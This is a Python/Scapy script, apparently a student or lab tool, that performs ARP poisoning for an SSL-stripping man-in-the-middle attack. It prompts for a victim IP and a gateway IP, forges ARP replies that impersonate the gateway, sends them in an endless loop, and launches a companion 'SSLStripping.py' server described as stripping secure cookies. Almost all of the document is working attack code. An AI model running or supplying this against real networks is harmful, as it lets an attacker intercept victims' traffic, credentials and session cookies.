from scapy.all import *

"""
file = open("vIP.txt")
vIP = file.read()
file.close()
file = open("gatewayIP.txt")
gatewayIP = file.read()
file.close()
"""

print "                                                               "
print "              _           _        _             _             "
print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
print "                                    |_|   |_|            |___/ "
print "                                                               "
print "                              Including secure cookie stripping"
print "                                                               "
print "                                                               "

vIP = raw_input("What is the victim IP address?")
gatewayIP = raw_input("What is the gateway IP address?")
NetworkI = raw_input("What is your network interface?")

def ip_to_mac(IP, retry = 2, timeout = 2):

    #create the arp packet that will retrieve the mac address
    arp = ARP()
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = IP
    arp.op = 1

    MacResponse, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in MacResponse:
    # return the mac address if the arp packet did get a response
        return r[ARP].underlayer.src

    # return none if mac address couldn't be found
    return None

# get the mac address of the victim
vMAC = ip_to_mac(vIP);

macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
#macAttacker = subprocess.check_output("cat /sys/class/net/eth0/address", shell = True)
#macAttacker = subprocess.check_output("cat /sys/class/net/" + NetworkI +"/address", shell = True)

#Create arp packet for victim
arpVictim = Ether() / ARP()
arpVictim[Ether].src = macAttacker
arpVictim[ARP].hwsrc = macAttacker
arpVictim[ARP].psrc = gatewayIP
arpVictim[ARP].hwdst = vMAC
arpVictim[ARP].pdst = vIP

#Start arpPoison
def arpPoison():
    sendp(arpVictim, iface="enp0s3")
    #sendp(arpVictim, iface="eth0")
    #sendp(arpVictim, iface=NetworkI)
    time.sleep(1)

#Open new terminal with cherrypy server
os.system("gnome-terminal -e 'python SSLStripping.py'")

while True:
    arpPoison()
